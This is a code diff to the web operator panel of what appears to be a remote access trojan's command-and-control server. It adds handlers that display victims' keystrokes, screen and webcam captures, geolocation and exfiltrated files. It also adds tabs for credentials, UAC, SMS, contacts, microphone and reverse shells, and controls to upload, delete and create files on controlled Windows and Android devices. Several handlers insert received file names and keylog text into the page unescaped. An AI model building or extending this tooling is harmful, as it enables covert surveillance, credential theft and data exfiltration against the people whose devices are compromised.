@@ -1229,7 +1229,53 @@
         </div>
     </div>
 
-    <script>// ============= GLOBAL STATE =============
+    <!-- Toast Notification Container -->
+    <div id="toastContainer"
+        style="position:fixed;top:20px;right:20px;z-index:99999;display:flex;flex-direction:column;gap:8px;pointer-events:none;">
+    </div>
+
+    <script>// ============= TOAST NOTIFICATION SYSTEM =============
+        function showToast(message, type = 'info', duration = 4000) {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            const colors = {
+                success: 'linear-gradient(135deg, #00c853, #009624)',
+                error: 'linear-gradient(135deg, #ff1744, #d50000)',
+                warning: 'linear-gradient(135deg, #ff9100, #ff6d00)',
+                info: 'linear-gradient(135deg, #00b0ff, #0091ea)'
+            };
+            const icons = { success: 'fa-check-circle', error: 'fa-exclamation-circle', warning: 'fa-exclamation-triangle', info: 'fa-info-circle' };
+            toast.style.cssText = `background:${colors[type] || colors.info};color:#fff;padding:12px 20px;border-radius:8px;font-family:Inter,sans-serif;font-size:13px;box-shadow:0 4px 20px rgba(0,0,0,.4);pointer-events:auto;display:flex;align-items:center;gap:10px;animation:toastSlide .3s ease;max-width:380px;word-break:break-word;`;
+            toast.innerHTML = `<i class="fas ${icons[type] || icons.info}"></i><span>${message}</span>`;
+            container.appendChild(toast);
+            setTimeout(() => { toast.style.opacity = '0'; toast.style.transform = 'translateX(100px)'; toast.style.transition = 'all .3s ease'; setTimeout(() => toast.remove(), 300); }, duration);
+        }
+
+        // Global fetch wrapper with error handling
+        async function fetchWithError(url, options = {}) {
+            try {
+                const resp = await fetch(url, options);
+                if (!resp.ok) {
+                    const errText = await resp.text().catch(() => resp.statusText);
+                    showToast(`API Error (${resp.status}): ${errText.substring(0, 100)}`, 'error');
+                    return null;
+                }
+                return resp;
+            } catch (err) {
+                showToast(`Network Error: ${err.message}`, 'error');
+                return null;
+            }
+        }
+
+        // Task History loader
+        async function loadTaskHistory(agentId) {
+            const resp = await fetchWithError(`/api/tasks/${agentId}?limit=50`);
+            if (!resp) return [];
+            const data = await resp.json();
+            return data.tasks || [];
+        }
+
+        // ============= GLOBAL STATE =========================
         let currentView = 'dashboard';
         let selectedAgent = null;
         let agents = [];
@@ -1244,6 +1290,7 @@
         let historyIndex = -1;
         let currentInput = '';
         let agentPlatform = 'windows';
+        let interactiveMode = false;
 
         // Mock data for demonstration
         const mockAgents = [
@@ -1301,8 +1348,208 @@
             if (msg.type === 'task_result') {
                 const { agent_id, result } = msg.data;
 
-                // 1. Handle Shell Output (Block raw print)
-                if (result.startsWith('[SHELL]')) {
+                // Handle nested JSON structured results (UNIVERSAL_PROTOCOL V4 style)
+                // Handle nested JSON structured results (UNIVERSAL_PROTOCOL V4 style)
+                let isStructured = false;
+                let parsedStruct = null;
+
+                try {
+                    parsedStruct = typeof result === 'string' ? JSON.parse(result) : result;
+                    if (parsedStruct && typeof parsedStruct === 'object' && parsedStruct.type) {
+                        isStructured = true;
+                    }
+                } catch (e) {
+                    // Not valid JSON, fall back to string prefixes
+                }
+
+                if (isStructured) {
+                    if (terminal && selectedAgent && selectedAgent.id === agent_id) {
+                        // Handle standard text output
+                        if (parsedStruct.type === "text" || parsedStruct.type === "error") {
+                            const out = parsedStruct.data && parsedStruct.data.text ? parsedStruct.data.text : "";
+
+                            // Let's strip the prefix out if it's there
+                            let cleanOut = out;
+                            let newPrompt = null;
+
+                            // Parse new ~~KAAL_CWD~~ marker (written on its own line by the agent)
+                            if (cleanOut.includes('~~KAAL_CWD~~')) {
+                                // Strip the entire marker line from display
+                                cleanOut = cleanOut.replace(/~~KAAL_CWD~~[^\r\n]*~~END~~[\r\n]*/g, '');
+                                const m = out.match(/~~KAAL_CWD~~(.+?)~~END~~/);
+                                if (m) newPrompt = `\x1b[1;34m${m[1].trim()}\x1b[0m $ `;
+                            } else if (cleanOut.startsWith('Changed to ')) {
+                                // Standard batch-mode cd response
+                                const newPath = cleanOut.substring(11).trim();
+                                newPrompt = `\x1b[1;34m${newPath}\x1b[0m $ `;
+                            }
+
+                            if (cleanOut.startsWith('[SHELL]')) {
+                                try {
+                                    const shellData = JSON.parse(cleanOut.substring(8));
+                                    cleanOut = shellData.out || "";
+                                    newPrompt = `\x1b[1;34m${shellData.cwd}\x1b[0m $ `;
+                                } catch (e) { }
+                            }
+
+                            if (cleanOut) {
+                                cleanOut = cleanOut.replace(/\r\n/g, '\n').replace(/\n/g, '\r\n');
+                                terminal.write(cleanOut);
+                            }
+
+                            if (newPrompt) shellPrompt = newPrompt;
+                            terminal.write('\r\n' + shellPrompt);
+                            terminal.scrollToBottom();
+                        }
+                    }
+
+                    // 1. Structural File Output Data parsing
+                    if (parsedStruct.type === "file_list") {
+                        if (parsedStruct.data && parsedStruct.data.files) {
+                            updateFileBrowser(parsedStruct.data.files, parsedStruct.data.path);
+                            if (parsedStruct.data.path) {
+                                shellPrompt = `\x1b[34m${parsedStruct.data.path}\x1b[0m $ `;
+                            }
+                            if (terminal && selectedAgent && selectedAgent.id === agent_id) {
+                                terminal.writeln("\r\n[+] File listing received.");
+
+                                // Echo exactly like a traditional 'ls' command to the terminal
+                                let lsOutput = "";
+                                parsedStruct.data.files.forEach(f => {
+                                    const size = f.is_dir ? "<DIR>" : f.size.toString().padStart(10);
+                                    const name = f.is_dir ? `\x1b[1;34m${f.name}\x1b[0m` : f.name;
+                                    lsOutput += `${size}  ${name}\r\n`;
+                                });
+                                terminal.write(lsOutput);
+                                terminal.write('\r\n' + shellPrompt);
+                            }
+                        }
+                    }
+
+                    // 2. Structural Screen Output parsing
+                    else if (parsedStruct.type === "screen" || parsedStruct.type === "webcam") {
+                        if (terminal && selectedAgent && selectedAgent.id === agent_id) {
+                            terminal.writeln("\r\n[+] Media capture received.");
+                            terminal.write(shellPrompt);
+                        }
+
+                        // Payload might be in `.data.b64` (nested) or directly in `.b64` (unwrapped or UPv3)
+                        const payload = (parsedStruct.data && parsedStruct.data.b64) ? parsedStruct.data.b64 : parsedStruct.b64;
+                        const screenContainer = document.getElementById('screenContainer');
+                        const webcamContainer = document.getElementById('webcamContainer');
+                        const mobileScreen = document.querySelector('.mobile-screen');
+
+                        const imgHtml = `<img src="data:image/jpeg;base64,${payload}" style="max-width: 100%; max-height: 100%; border-radius: 4px;">`;
+                        if (parsedStruct.type === "screen" && screenContainer) screenContainer.innerHTML = imgHtml;
+                        if (parsedStruct.type === "screen" && mobileScreen) mobileScreen.innerHTML = imgHtml;
+                        if (parsedStruct.type === "webcam" && webcamContainer) webcamContainer.innerHTML = imgHtml;
+
+                    }
+
+                    // 3. Structured Keylogger Output
+                    else if (parsedStruct.type === "keylog") {
+                        if (terminal && selectedAgent && selectedAgent.id === agent_id) {
+                            terminal.writeln("\r\n[+] Keylog data string received.");
+                            terminal.write(shellPrompt);
+                        }
+                        const logData = (parsedStruct.data && parsedStruct.data.text) ? parsedStruct.data.text : (parsedStruct.text || "");
+                        const keylogContainer = document.getElementById('keylogContainer');
+                        if (keylogContainer) {
+                            if (keylogContainer.innerText.includes('Ready.')) keylogContainer.innerHTML = '';
+                            const timestamp = new Date().toLocaleTimeString();
+                            const formattedLog = logData.replace(/\n/g, '<br>');
+                            keylogContainer.innerHTML += `<div><span style="color:var(--accent-primary)">[${timestamp}]</span> ${formattedLog}</div>`;
+                            keylogContainer.scrollTop = keylogContainer.scrollHeight;
+                        }
+                    }
+
+                    // 4. Structural Geo Location tracking
+                    else if (parsedStruct.type === "geo") {
+                        if (terminal && selectedAgent && selectedAgent.id === agent_id) {
+                            terminal.writeln("\r\n[+] Geo Coordinates captured.");
+                            terminal.write(shellPrompt);
+                        }
+                        updateLocationMap(parsedStruct.data);
+                    }
+
+                    // 5. Download Files Handlers (single-shot, Python agent)
+                    else if (parsedStruct.type === "download") {
+                        // Python standalone_agent: {type:"download", filename:…, data:…}
+                        const filename = parsedStruct.filename || (parsedStruct.data && parsedStruct.data.filename);
+                        const b64 = parsedStruct.data || parsedStruct.b64 || (parsedStruct.data && parsedStruct.data.data);
+                        if (filename && b64) {
+                            const link = document.createElement('a');
+                            link.href = `data:application/octet-stream;base64,${typeof b64 === 'string' ? b64 : b64.data || b64}`;
+                            link.download = filename;
+                            link.click();
+                            showTransferProgress(`Downloaded ${filename}`, 100);
+                            if (terminal && selectedAgent && selectedAgent.id === agent_id) {
+                                terminal.writeln(`\r\n[+] Downloaded: ${filename}`);
+                                terminal.write(shellPrompt);
+                            }
+                        }
+                    }
+
+                    // 6. Chunked Download Handler (C agent download_chunk packets)
+                    else if (parsedStruct.type === "download_chunk") {
+                        // C agent payload: {type:"download_chunk", data:{chunk_index, total_chunks, stream_id, hash, data, filename}}
+                        const cd = parsedStruct.data || {};
+                        const streamId = cd.stream_id || 'default';
+                        const idx = cd.chunk_index;
+                        const total = cd.total_chunks;
+                        const filename = (cd.filename || '').split('\\').pop().split('/').pop();
+                        const b64Chunk = cd.data || '';
+
+                        if (!window._dlChunks) window._dlChunks = {};
+                        if (!window._dlChunks[streamId]) window._dlChunks[streamId] = { chunks: {}, filename: filename, total: total };
+                        window._dlChunks[streamId].chunks[idx] = b64Chunk;
+
+                        // Update progress bar
+                        const received = Object.keys(window._dlChunks[streamId].chunks).length;
+                        const pct = (received / total) * 100;
+                        showTransferProgress(`Downloading ${filename}`, pct);
+
+                        if (terminal && selectedAgent && selectedAgent.id === agent_id) {
+                            terminal.writeln(`\r\n[+] Chunk ${idx + 1}/${total} received for ${filename}`);
+                        }
+
+                        if (received >= total) {
+                            // Reassemble all chunks in order
+                            let fullB64 = '';
+                            for (let i = 0; i < total; i++) fullB64 += (window._dlChunks[streamId].chunks[i] || '');
+                            const link = document.createElement('a');
+                            link.href = `data:application/octet-stream;base64,${fullB64}`;
+                            link.download = filename;
+                            link.click();
+                            delete window._dlChunks[streamId];
+                            showTransferProgress(`Downloaded ${filename}`, 100);
+                            if (terminal && selectedAgent && selectedAgent.id === agent_id) {
+                                terminal.writeln(`\r\n[+] Download complete: ${filename}`);
+                                terminal.write(shellPrompt);
+                            }
+                        }
+                    }
+
+                    // For fallback legacy string formats encoded within V4 wraps by the C Agent...
+                    if (parsedStruct.type === "text" || parsedStruct.type === "error") {
+                        const textPayload = parsedStruct.data && parsedStruct.data.text ? parsedStruct.data.text : "";
+                        if (textPayload.startsWith('[')) {
+                            // Let the legacy block handle it
+                            result = textPayload;
+                        } else {
+                            if (textPayload.startsWith('Changed to ')) {
+                                shellPrompt = `\x1b[34m${textPayload.substring(11)}\x1b[0m $ `;
+                            }
+                            return;
+                        }
+                    } else {
+                        return; // Return execution early when using proper structural logic wrappers
+                    }
+                }
+
+                // ================= LEGACY STRING STRIPPER FALLBACK LOGIC =================
+                // 1. Handle Legacy Shell Output Strings (Block raw print)
+                if (typeof result === 'string' && result.startsWith('[SHELL]')) {
                     if (terminal && selectedAgent && selectedAgent.id === agent_id) {
                         try {
                             const data = JSON.parse(result.substring(8));
@@ -1459,20 +1706,22 @@
                     }
                 }
                 else if (result.startsWith('[DOWNLOAD]')) {
-                    // Format: [DOWNLOAD] filename base64
-                    const parts = result.substring(11).split(' ');
-                    if (parts.length >= 2) {
-                        const filename = parts[0];
-                        const b64 = parts[1];
-                        const link = document.createElement('a');
-                        link.href = `data:application/octet-stream;base64,${b64}`;
-                        link.download = filename;
-                        link.click();
-                        // Also show in terminal
-                        if (terminal && selectedAgent && selectedAgent.id === agent_id) {
-                            terminal.writeln(`\r\n[+] Downloaded: ${filename}`);
-                            terminal.write('$ ');
+                    try {
+                        const jsonPayload = JSON.parse(result.substring(10).trim());
+                        const filename = jsonPayload.filename;
+                        const b64 = jsonPayload.data || jsonPayload.b64;
+                        if (filename && b64) {
+                            const link = document.createElement('a');
+                            link.href = `data:application/octet-stream;base64,${b64}`;
+                            link.download = filename;
+                            link.click();
+                            if (terminal && selectedAgent && selectedAgent.id === agent_id) {
+                                terminal.writeln(`\r\n[+] Downloaded: ${filename}`);
+                                terminal.write('$ ');
+                            }
                         }
+                    } catch (e) {
+                        console.error("Failed to parse download string:", e);
                     }
                 }
                 else if (result.startsWith('[CREDS]')) {
@@ -1487,21 +1736,26 @@
 
         // ============= HELPER RENDERERS for RESULTS =============
         function renderFileList(files) {
-            const listPanel = document.getElementById('fileListPanel');
+            const listPanel = document.getElementById('fileTableBody');
             const treePanel = document.getElementById('fileTreePanel');
             if (listPanel) {
                 listPanel.innerHTML = files.map(f => `
-                    <div style="border-bottom: 1px solid var(--border); padding-bottom: 8px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center;">
-                        <span style="display: flex; align-items: center; gap: 8px; cursor: pointer;" onclick="if(${f.is_dir}) sendCommand('ls', ['${f.name.replace(/\\/g, '\\\\')}'])">
-                            <i class="fas fa-${f.is_dir ? 'folder' : 'file'}" style="color: ${f.is_dir ? 'var(--accent-primary)' : 'var(--text-primary)'}"></i> 
-                            ${f.name}
-                        </span>
-                        <div style="display: flex; gap: 8px;">
-                            <span style="color: var(--text-muted); font-size: 12px; margin-right: 8px;">${f.size || ''}</span>
-                            ${!f.is_dir ? `<i class="fas fa-download" style="cursor: pointer; color: var(--accent-primary);" onclick="sendCommand('download', ['${f.name}'])" title="Download"></i>` : ''}
-                        </div>
-                    </div>
+                    <tr class="file-row" data-name="${f.name.replace(/"/g, '&quot;')}" data-isdir="${f.is_dir}">
+                        <td>
+                            <span style="display: flex; align-items: center; gap: 8px;">
+                                <i class="fas fa-${f.is_dir ? 'folder' : 'file'}" style="color: ${f.is_dir ? '#f39c12' : '#bdc3c7'}"></i> 
+                                <span class="file-name">${f.name}</span>
+                            </span>
+                        </td>
+                        <td class="file-date">${f.modified_date || ''}</td>
+                        <td class="file-type">${f.is_dir ? 'File folder' : 'File'}</td>
+                        <td class="file-size">${f.size || ''}</td>
+                    </tr>
                 `).join('');
+
+                // Update footer count
+                const countEl = document.getElementById('fileCount');
+                if (countEl) countEl.innerText = `${files.length} items`;
             }
             if (treePanel) {
                 // Parse parent path
@@ -1516,6 +1770,130 @@
                 }
             }
         }
+
+        let selectedFile = null;
+        let selectedIsDir = false;
+        let selectedFileSize = 0;
+
+        // Global Event Delegation for File Table (Works for dynamic DOM)
+        document.addEventListener('click', function (e) {
+            const row = e.target.closest('tr.file-row');
+            if (row) {
+                const now = new Date().getTime();
+                const lastClick = row.dataset.lastClick || 0;
+                row.dataset.lastClick = now;
+
+                if (now - lastClick < 300) {
+                    // Double Click: Navigate
+                    const isDir = row.getAttribute('data-isdir') === 'true';
+                    const name = row.getAttribute('data-name');
+                    if (isDir) {
+                        sendCommand('ls', [name]);
+                    }
+                } else {
+                    // Single Click: Select
+                    const rows = document.querySelectorAll('#fileTableBody tr');
+                    rows.forEach(r => r.classList.remove('selected'));
+
+                    row.classList.add('selected');
+                    selectedFile = row.getAttribute('data-name');
+                    selectedIsDir = row.getAttribute('data-isdir') === 'true';
+
+                    const countEl = document.getElementById('selectedCount');
+                    if (countEl) countEl.innerText = `1 item selected`;
+                }
+            }
+        });
+
+        function triggerUploadReal() {
+            if (!selectedAgent) return;
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.onchange = async e => {
+                const file = e.target.files[0];
+                if (!file) return;
+                const formData = new FormData();
+                formData.append('file', file);
+                formData.append('destination', currentPath);
+
+                if (terminal) terminal.writeln(`\r\n[!] Uploading ${file.name} to ${currentPath}...`);
+                showTransferProgress(`Uploading ${file.name}`, 0);
+
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', `/api/files/${selectedAgent.id}`, true);
+
+                xhr.upload.onprogress = (ev) => {
+                    if (ev.lengthComputable) {
+                        const pct = (ev.loaded / ev.total) * 100;
+                        showTransferProgress(`Uploading ${file.name}`, pct);
+                    }
+                };
+                xhr.onload = () => {
+                    showTransferProgress(`Uploaded ${file.name}`, 100);
+                    if (terminal) terminal.writeln(`\r\n[+] Upload complete: ${file.name}`);
+                    setTimeout(() => sendCommand('ls', [currentPath]), 1000);
+                };
+                xhr.onerror = () => {
+                    showTransferProgress(`Upload failed`, 0);
+                    if (terminal) terminal.writeln(`\r\n[-] Upload failed: ${file.name}`);
+                };
+                xhr.send(formData);
+            };
+            input.click();
+        }
+
+        function handleFileDelete() {
+            if (selectedFile) {
+                if (confirm(`Are you sure you want to delete ${selectedFile}?`)) {
+                    let path = currentPath !== '.' && currentPath !== './' ? currentPath + '/' + selectedFile : selectedFile;
+                    fetch(`/api/files/${selectedAgent.id}`, {
+                        method: 'DELETE',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ path: path })
+                    }).then(() => setTimeout(() => sendCommand('ls', [currentPath]), 1000));
+                }
+            } else alert("Select a file first.");
+        }
+
+        function handleCreateFolder() {
+            const folderName = prompt("Enter new folder name:");
+            if (folderName) {
+                let path = currentPath !== '.' && currentPath !== './' ? currentPath + '/' + folderName : folderName;
+                fetch(`/api/files/${selectedAgent.id}/mkdir`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ path: path })
+                }).then(() => setTimeout(() => sendCommand('ls', [currentPath]), 1000));
+            }
+        }
+
+        function handleCreateFile() {
+            const fileName = prompt("Enter new file name with extension (e.g. keylogger.ps1):");
+            if (fileName) {
+                let path = currentPath !== '.' && currentPath !== './' ? currentPath + '/' + fileName : fileName;
+                fetch(`/api/files/${selectedAgent.id}/mkfile`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ path: path })
+                }).then(() => setTimeout(() => sendCommand('ls', [currentPath]), 1000));
+            }
+        }
+
+        function handleFileRename() {
+            if (selectedFile) {
+                const newName = prompt("Enter new name:", selectedFile);
+                if (newName && newName !== selectedFile) {
+                    let oldPath = currentPath !== '.' && currentPath !== './' ? currentPath + '/' + selectedFile : selectedFile;
+                    let newPath = currentPath !== '.' && currentPath !== './' ? currentPath + '/' + newName : newName;
+                    fetch(`/api/files/${selectedAgent.id}/rename`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ old_path: oldPath, new_path: newPath })
+                    }).then(() => setTimeout(() => sendCommand('ls', [currentPath]), 1000));
+                }
+            } else alert("Select a file first.");
+        }
+
 
         function triggerUpload() {
             const input = document.createElement('input');
@@ -1664,7 +2042,16 @@
                     </div>
                 </div>
             `;
-            document.getElementById('contentArea').innerHTML = html;
+            let node;
+            if (viewNodes.dashboard) {
+                viewNodes.dashboard.innerHTML = html; // Refresh data in place
+                node = viewNodes.dashboard;
+            } else {
+                node = document.createElement('div');
+                node.innerHTML = html;
+                viewNodes.dashboard = node;
+            }
+            showViewNode(node);
 
             // Initialize chart
             if (typeof Chart !== 'undefined') {
@@ -1735,7 +2122,16 @@
                     </table>
                 </div>
             `;
-            document.getElementById('contentArea').innerHTML = html;
+            let node;
+            if (viewNodes.agentsList) {
+                viewNodes.agentsList.innerHTML = html; // Refresh data in place
+                node = viewNodes.agentsList;
+            } else {
+                node = document.createElement('div');
+                node.innerHTML = html;
+                viewNodes.agentsList = node;
+            }
+            showViewNode(node);
         }
 
         function selectAgent(agentId) {
@@ -1766,47 +2162,126 @@
             }
         }
 
+
+        // ============= DOM CACHING FOR SPA STATE =============
+        let viewNodes = {
+            dashboard: null,
+            agentsList: null
+        };
+
+        function showViewNode(nodeToShow) {
+            const contentArea = document.getElementById('contentArea');
+            // Hide all children
+            Array.from(contentArea.children).forEach(child => {
+                child.style.display = 'none';
+            });
+            if (!contentArea.contains(nodeToShow)) {
+                contentArea.appendChild(nodeToShow);
+            }
+            // Re-apply specific default flex styles for agent detail:
+            if (nodeToShow.classList.contains('agent-detail-wrapper')) {
+                nodeToShow.style.display = 'flex';
+                nodeToShow.style.flexDirection = 'column';
+                nodeToShow.style.height = '100%';
+            } else {
+                nodeToShow.style.display = 'block';
+            }
+        }
+
+        async function clearAgentQueue() {
+            if (!selectedAgent) return;
+            const confirmed = confirm("Are you sure you want to clear this agent's pending task queue? Active tasks will not be stopped, but queued tasks will be dropped.");
+            if (!confirmed) return;
+
+            try {
+                const response = await fetch('/api/agents/queue/clear', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ agent_id: selectedAgent.id })
+                });
+                
+                if (response.ok) {
+                    if (terminal) terminal.writeln('\r\n[+] Queue cleared successfully.');
+                    else showToast('Queue cleared successfully.', 'success');
+                } else {
+                    const err = await response.json();
+                    if (terminal) terminal.writeln(`\r\n[-] Failed to clear queue: ${err.detail || 'Unknown error'}`);
+                    else showToast(`Failed to clear queue: ${err.detail || 'Unknown error'}`, 'error');
+                }
+            } catch(e) {
+                if (terminal) terminal.writeln(`\r\n[-] Failed to clear queue: ${e.message}`);
+                else showToast(`Failed to clear queue: ${e.message}`, 'error');
+            }
+        }
+
         function renderAgentDetail() {
             if (!selectedAgent) return;
-            document.getElementById('pageTitle').innerHTML = `AGENT: ${selectedAgent.id.slice(0, 8)}... <span style="font-size: 14px; color: var(--accent-primary); margin-left: 16px;">${selectedAgent.status}</span>`;
+            const agId = selectedAgent.id;
+            
+            document.getElementById('pageTitle').innerHTML = `AGENT: ${agId.slice(0, 8)}... <span style="font-size: 14px; color: var(--accent-primary); margin-left: 16px;">${selectedAgent.status}</span>`;
 
             let tabsHtml = '';
+            
             let tabContentHtml = '';
+            const allTabs = ['shell', 'files', 'screen', 'webcam', 'camera', 'mic', 'history', 'keylog', 'location', 'uac', 'creds', 'android', 'sms', 'contacts', 'revshells'];
+            allTabs.forEach(tab => {
+                let content = '';
+                if (tab === 'shell') content = renderShell();
+                else if (tab === 'files') content = renderFileManager();
+                else if (tab === 'screen') content = renderScreenViewer();
+                else if (tab === 'webcam' || tab === 'camera') content = renderWebcam();
+                else if (tab === 'mic') content = renderMicrophone();
+                else if (tab === 'keylog') content = renderKeylogger();
+                else if (tab === 'location') content = renderLocation();
+                else if (tab === 'uac') content = renderUAC();
+                else if (tab === 'creds') content = renderCredAudit();
+                else if (tab === 'android') content = renderAndroidFrame();
+                else if (tab === 'history') content = renderTaskHistory();
+                else if (tab === 'sms') content = renderSMS();
+                else if (tab === 'contacts') content = renderContacts();
+                else if (tab === 'revshells') content = renderRevShells();
+
+                const d = (tab === 'shell') ? 'block' : 'none';
+                tabContentHtml += `<div class="tab-content" id="tabContent_${tab}" style="display:${d};height:100%;">${content}</div>`;
+            });
 
             // Platform-specific tabs
             if (selectedAgent.platform === 'windows') {
                 tabsHtml = `
                     <div class="tab active" data-tab="shell"><i class="fas fa-terminal"></i> Shell</div>
+                    <div class="tab" data-tab="revshells"><i class="fas fa-bolt" style="color:#e74c3c;"></i> Rev Shells</div>
                     <div class="tab" data-tab="files"><i class="fas fa-folder-tree"></i> Files</div>
                     <div class="tab" data-tab="screen"><i class="fas fa-desktop"></i> Screen</div>
                     <div class="tab" data-tab="webcam"><i class="fas fa-camera"></i> Webcam</div>
                     <div class="tab" data-tab="mic"><i class="fas fa-microphone"></i> Microphone</div>
+                    <div class="tab" data-tab="history"><i class="fas fa-history"></i> History</div>
                     <div class="tab" data-tab="keylog"><i class="fas fa-keyboard"></i> Keylogger</div>
                     <div class="tab" data-tab="location"><i class="fas fa-map-pin"></i> Location</div>
                     <div class="tab" data-tab="uac"><i class="fas fa-shield"></i> UAC</div>
                     <div class="tab" data-tab="creds"><i class="fas fa-key"></i> Credentials</div>
                 `;
-                tabContentHtml = `<div class="tab-content" id="tabShell">${renderShell()}</div>`;
             } else if (selectedAgent.platform === 'android') {
                 tabsHtml = `
                     <div class="tab active" data-tab="shell"><i class="fas fa-terminal"></i> Shell</div>
+                    <div class="tab" data-tab="revshells"><i class="fas fa-bolt" style="color:#e74c3c;"></i> Rev Shells</div>
                     <div class="tab" data-tab="android"><i class="fas fa-mobile-alt"></i> Device</div>
                     <div class="tab" data-tab="files"><i class="fas fa-folder-tree"></i> Files</div>
                     <div class="tab" data-tab="screen"><i class="fas fa-mobile-screen"></i> Screen</div>
                     <div class="tab" data-tab="camera"><i class="fas fa-camera"></i> Camera</div>
                     <div class="tab" data-tab="mic"><i class="fas fa-microphone"></i> Mic</div>
+                    <div class="tab" data-tab="history"><i class="fas fa-history"></i> History</div>
                     <div class="tab" data-tab="sms"><i class="fas fa-comment"></i> SMS</div>
                     <div class="tab" data-tab="contacts"><i class="fas fa-address-book"></i> Contacts</div>
                     <div class="tab" data-tab="location"><i class="fas fa-map-pin"></i> Location</div>
                 `;
-                tabContentHtml = `<div class="tab-content" id="tabShell">${renderShell()}</div>`;
             } else {
                 tabsHtml = `
                     <div class="tab active" data-tab="shell"><i class="fas fa-terminal"></i> Shell</div>
+                    <div class="tab" data-tab="revshells"><i class="fas fa-bolt" style="color:#e74c3c;"></i> Rev Shells</div>
                     <div class="tab" data-tab="files"><i class="fas fa-folder-tree"></i> Files</div>
                     <div class="tab" data-tab="screen"><i class="fas fa-desktop"></i> Screen</div>
+                    <div class="tab" data-tab="history"><i class="fas fa-history"></i> History</div>
                 `;
-                tabContentHtml = `<div class="tab-content" id="tabShell">${renderShell()}</div>`;
             }
 
             let html = `
@@ -1821,6 +2296,7 @@
                             </div>
                         </div>
                         <div style="display: flex; gap: 10px;">
+                            <button class="btn btn-outline" style="border-color: #e74c3c; color: #e74c3c;" onclick="clearAgentQueue()"><i class="fas fa-broom"></i> Clear Queue</button>
                             <button class="btn btn-outline" onclick="promptSwitchRelay()"><i class="fas fa-exchange-alt"></i> Switch Relay</button>
                             <button class="btn btn-outline" onclick="navigateTo('agents')"><i class="fas fa-arrow-left"></i> Back</button>
                         </div>
@@ -1828,44 +2304,33 @@
                     <div class="tabs" id="agentTabs">
                         ${tabsHtml}
                     </div>
-                    <div id="tabContentContainer">
+                    <div id="tabContentContainer" style="position:relative; height:100%;">
                         ${tabContentHtml}
                     </div>
                 </div>
             `;
             document.getElementById('contentArea').innerHTML = html;
 
-            // Attach tab click handlers
-            document.querySelectorAll('.tab').forEach(tab => {
+            // Attach tab click handlers to the specific node
+            const contentArea = document.getElementById('contentArea');
+            contentArea.querySelectorAll('.tab').forEach(tab => {
                 tab.addEventListener('click', function (e) {
-                    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                    contentArea.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                     this.classList.add('active');
                     const tabId = this.dataset.tab;
-                    let content = '';
-                    if (tabId === 'shell') content = renderShell();
-                    else if (tabId === 'files') content = renderFileManager();
-                    else if (tabId === 'screen') content = renderScreenViewer();
-                    else if (tabId === 'webcam' || tabId === 'camera') content = renderWebcam();
-                    else if (tabId === 'mic') content = renderMicrophone();
-                    else if (tabId === 'keylog') content = renderKeylogger();
-                    else if (tabId === 'location') content = renderLocation();
-                    else if (tabId === 'uac') content = renderUAC();
-                    else if (tabId === 'creds') content = renderCredAudit();
-                    else if (tabId === 'android') content = renderAndroidFrame();
-                    else if (tabId === 'sms') content = renderSMS();
-                    else if (tabId === 'contacts') content = renderContacts();
-                    document.getElementById('tabContentContainer').innerHTML = `<div class="tab-content">${content}</div>`;
+                    
+                    contentArea.querySelectorAll('.tab-content').forEach(tc => tc.style.display = 'none');
+                    let targetContent = document.getElementById('tabContent_' + tabId);
+                    if(targetContent) targetContent.style.display = 'block';
 
-                    // Initialize terminal if shell tab
+                    // Post-switch init
                     if (tabId === 'shell') {
-                        setTimeout(() => initTerminal(), 50);
-                    }
-                    // Initialize map if location tab
-                    else if (tabId === 'location') { // Changed to else if for clarity
+                        setTimeout(() => { if(fitAddon) fitAddon.fit(); }, 50);
+                    } else if (tabId === 'revshells') {
+                        setTimeout(() => _rsRelayout(), 80);
+                    } else if (tabId === 'location') {
                         setTimeout(() => initMap(), 100);
-                    }
-                    // Initialize File Browser if files tab
-                    else if (tabId === 'files') {
+                    } else if (tabId === 'files') {
                         setTimeout(() => {
                             if (currentFileList && currentFileList.length > 0) {
                                 console.log("Restoring File Browser state...");
@@ -1875,16 +2340,20 @@
                                 sendCommand('ls', ['.']);
                             }
                         }, 50);
+                    } else if (tabId === 'history') {
+                        setTimeout(() => loadTaskHistory(selectedAgent.id).then(displayTaskHistory), 0);
                     }
                 });
             });
 
             // Initialize terminal for shell tab
-            setTimeout(() => initTerminal(), 50);
+            setTimeout(() => {
+                initAdvancedTerminal();
+            }, 50);
         }
 
-        // ============= COMMAND SENDING =============
-        async function sendCommand(command, params = []) {
+        // ============= COMMAND SENDING TOAST DEFINITION =============
+        async function sendCommandToast(command, params = []) {
             if (!selectedAgent) return;
 
             // Optimistic UI update
@@ -1894,20 +2363,30 @@
             }
 
             try {
-                // Determine full command string
-                const fullCmd = params.length > 0 ? `${command} ${params.join(' ')}` : command;
+                // Determine full legacy string format for backward compat during transition
+                const legacyCmdStr = params.length > 0 ? `${command} ${params.join(' ')}` : command;
+
+                // Create the Universal Protocol V4 Task Payload structure
+                const taskPayload = {
+                    command: legacyCmdStr,
+                    structured_params: {
+                        base_cmd: command,
+                        args: params
+                    }
+                };
 
                 await fetch('/api/command', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         agent_id: selectedAgent.id,
-                        command: fullCmd
+                        // The server pushes this value directly into the task queue `payload.command` field
+                        command: JSON.stringify(taskPayload)
                     })
                 });
 
                 // Show toast or log
-                console.log(`Sent command: ${fullCmd}`);
+                console.log(`Sent command: ${legacyCmdStr}`);
 
             } catch (e) {
                 console.error("Command error:", e);
@@ -1919,6 +2398,15 @@
         async function sendCommand(command, params = []) {
             if (!selectedAgent) return;
 
+            // Show folder loading bar on ls commands
+            if (command === 'ls' || command === 'file_list') {
+                showFolderLoading();
+            }
+            // Show download in-progress bar
+            if (command === 'download') {
+                showTransferProgress('Requesting download…', 5);
+            }
+
             // Optimistic UI update
             if (command === 'screenshot') {
